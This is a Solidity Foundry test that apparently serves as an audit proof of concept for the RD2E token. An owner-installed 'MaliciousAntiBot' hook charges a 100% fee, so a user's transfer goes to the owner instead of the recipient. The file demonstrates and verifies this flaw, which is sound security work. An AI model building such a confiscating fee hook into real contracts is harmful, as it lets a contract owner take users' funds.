// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/RD2E.sol";

contract MaliciousAntiBot {
    function protect(address, address, uint256 amount) external pure returns (uint256) {
        return amount; // Returns 100% fee
    }
}

contract RD2E_AntiBotExploitTest is Test {
    RD2E public token;
    MaliciousAntiBot public maliciousBot;
    address owner = makeAddr("owner");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(owner);
        token = new RD2E();
        maliciousBot = new MaliciousAntiBot();
        
        // Set malicious antiBot contract
        token.setAntiBotAddress(address(maliciousBot));
        token.setAntiBnotEnabled(true);
        
        // Mint tokens to user
        token.mint(user, 1000 ether); // 1000 tokens with 18 decimals
        vm.stopPrank();
    }

    function testAntiBotFeeTheft() public {
        console.log("--- BEFORE Transfer ---");
        
        // Capture initial balances
        uint256 balanceUserBefore = token.balanceOf(user);
        uint256 balanceAttackerBefore = token.balanceOf(attacker);
        uint256 balanceOwnerBefore = token.balanceOf(owner);
        
        console.log("User starting balance:         %s tokens", balanceUserBefore);
        console.log("Attacker starting balance:      %s tokens", balanceAttackerBefore);
        console.log("Owner starting balance:         %s tokens", balanceOwnerBefore);
        console.log("Transfer amount:                100 tokens");
        
        console.log("\n--- Trigger Transfer ---");
        // Execute victim transaction
        vm.prank(user);
        token.transfer(attacker, 100 ether);
        
        console.log("Transfer complete - checking balances\n");
        
        console.log("--- AFTER Transfer ---");
        // Capture post-transfer balances
        uint256 balanceUserAfter = token.balanceOf(user);
        uint256 balanceAttackerAfter = token.balanceOf(attacker);
        uint256 balanceOwnerAfter = token.balanceOf(owner);
        
        console.log("User resulting balance:         %s tokens", balanceUserAfter);
        console.log("Attacker resulting balance:      %s tokens", balanceAttackerAfter);
        console.log("Owner resulting balance:         %s tokens", balanceOwnerAfter);
        
        // Calculate actual token transfers
        uint256 userLoss = balanceUserBefore - balanceUserAfter;
        uint256 attackerGain = balanceAttackerAfter - balanceAttackerBefore;
        uint256 ownerGain = balanceOwnerAfter - balanceOwnerBefore;
        uint256 collectedFee = userLoss - attackerGain;
        
        console.log("\n--- Result Verification ---");
        console.log("Tokens removed from user:       %s", userLoss);
        console.log("Tokens received by attacker:     %s", attackerGain);
        console.log("Tokens collected by owner (fee): %s", ownerGain);
        console.log("Calculated fee amount:           %s", collectedFee);
        
        // Vulnerability verification logic
        bool exploitSuccess = (ownerGain == 100 ether) && 
                              (attackerGain == 0) && 
                              (userLoss == 100 ether);
        
        console.log("\n--- Exploit Status ---");
        if (exploitSuccess) {
            console.log("Vulnerability Exists: Malicious fee contract successfully intercepted entire transfer amount");
        } else {
            console.log("Vulnerability not Exist: Fee theft failed - attacker received tokens or owner didn't collect fee");
        }
    }
}